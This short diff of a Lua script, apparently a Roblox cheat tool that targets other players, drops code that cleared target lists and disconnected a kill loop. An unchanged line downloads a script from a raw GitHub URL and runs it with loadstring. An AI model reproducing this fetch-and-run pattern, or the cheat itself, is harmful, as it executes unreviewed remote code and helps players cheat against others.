@@ -175,24 +175,13 @@ if not sharedRevenge then
     sharedRevenge.Parent = workspace
 end
 
---// AUTO  FUNCTION
+--// AUTO FUNCTION
 local function execute()
-    -- Set activation state
+    -- Optional: indicate that this script is now running
     isd = true
     oldScriptActive = false
-    
-    -- Clear all targets when activating new script
-    targetList = {}
-    targetNames = {}
-    temporaryTargets = {}
-    oneShotTargets = {}
-    
-    -- Disconnect killloop
-    if CN then 
-        CN:Disconnect() 
-        CN = nil
-    end
-    
+
+    -- Just run the external script without touching targets or connections
     pcall(function()
         loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/aci.lua'))()
     end)
